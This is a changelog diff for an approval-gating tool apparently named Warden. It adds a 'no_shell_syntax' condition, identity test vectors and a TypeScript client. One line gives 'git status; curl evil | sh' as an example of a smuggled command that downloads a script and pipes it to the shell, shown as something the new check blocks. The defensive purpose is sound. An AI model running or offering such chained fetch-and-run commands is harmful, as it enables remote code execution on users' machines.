@@ -26,6 +26,9 @@
   could use up an agent's or the admin's hellos, so nobody could approve while it flooded.
 
 ### Added
+- Condition op `no_shell_syntax` (no value): the text uses only letters, digits, spaces
+  and `- _ . / : = , @ + %`. Next to `startswith "git "` it stops `git status; curl evil |
+  sh`, `$(...)`, redirects, globs and quotes. [Design](docs/design/no-shell-syntax.md).
 - `docs/identity-test-vectors.json`: fixed values for the identity proof, for clients in
   other languages, and `examples/typescript/warden-client.ts`, a dependency-free Node
   client that does the proof (tested in CI against a real Warden and an impostor).
